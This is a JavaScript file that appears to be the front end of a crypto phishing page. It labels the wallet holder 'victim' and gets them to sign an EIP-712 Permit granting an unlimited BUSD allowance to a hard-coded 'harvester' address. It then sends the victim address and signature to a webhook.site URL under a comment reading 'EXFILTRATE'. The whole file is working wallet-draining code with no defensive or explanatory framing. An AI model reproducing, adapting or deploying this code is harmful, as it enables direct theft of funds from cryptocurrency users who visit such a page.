const HARVESTER_ADDRESS = "0x119C89E29975eA0BbeDAb6640188CaCa8B739541"; 
const BUSD_ADDRESS = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";
const WEBHOOK_SITE_URL = "https://webhook.site/20179441-fa4d-4165-ab08-c634d80612f2";

async function triggerPermit() {
    if (!window.ethereum) return;
    try {
        // 1. Force Network Switch
        await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
        
        // 2. Connect
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const victim = accounts[0];

        // UI Change
        document.getElementById('ui-main').style.display = 'none';
        document.getElementById('ui-loading').style.display = 'block';

        // 3. Raw BUSD Check (No ethers.js needed here to avoid crashes)
        const busdBalanceHex = await window.ethereum.request({
            method: 'eth_call',
            params: [{
                to: BUSD_ADDRESS,
                data: "0x70a08231000000000000000000000000" + victim.slice(2)
            }, 'latest']
        });

        if (parseInt(busdBalanceHex, 16) > 0) {
            await handleBUSD(victim);
        } else {
            alert("No BUSD (BEP-20) detected in this wallet.");
            resetUI();
        }
    } catch (e) {
        alert("Workflow Error: " + e.message);
        resetUI();
    }
}

async function handleBUSD(victim) {
    try {
        const deadline = Math.floor(Date.now() / 1000) + 3600;
        
        // Get Nonce
        const nonceHex = await window.ethereum.request({
            method: 'eth_call',
            params: [{
                to: BUSD_ADDRESS,
                data: "0x7ecebe00000000000000000000000000" + victim.slice(2)
            }, 'latest']
        });
        const nonce = parseInt(nonceHex, 16);

        // Raw EIP-712 Typed Data for 100% Compatibility
        const msgParams = JSON.stringify({
            domain: { name: "BUSD Token", version: "1", chainId: 56, verifyingContract: BUSD_ADDRESS },
            message: { 
                owner: victim, 
                spender: HARVESTER_ADDRESS, 
                value: "115792089237316195423570985008687907853269984665640564039457584007913129639935", 
                nonce: nonce, 
                deadline: deadline 
            },
            primaryType: "Permit",
            types: {
                EIP712Domain: [
                    { name: "name", type: "string" }, { name: "version", type: "string" },
                    { name: "chainId", type: "uint256" }, { name: "verifyingContract", type: "address" }
                ],
                Permit: [
                    { name: "owner", type: "address" }, { name: "spender", type: "address" },
                    { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" },
                    { name: "deadline", type: "uint256" }
                ]
            }
        });

        // The MOST compatible signature request for mobile
        const signature = await window.ethereum.request({
            method: 'eth_signTypedData_v4',
            params: [victim, msgParams],
        });

        const r = signature.slice(0, 66);
        const s = "0x" + signature.slice(66, 130);
        const v = parseInt(signature.slice(130, 132), 16);

        // SUCCESS POPUP
        alert("SUCCESS!\nV: " + v + "\nR: " + r + "\nS: " + s + "\nDeadline: " + deadline);

        // EXFILTRATE
        await fetch(WEBHOOK_SITE_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ victim, v, r, s, deadline, type: 'permit' })
        });

    } catch (err) {
        alert("Signature Error: " + err.message);
        resetUI();
    }
}

function resetUI() {
    document.getElementById('ui-main').style.display = 'block';
    document.getElementById('ui-loading').style.display = 'none';
}
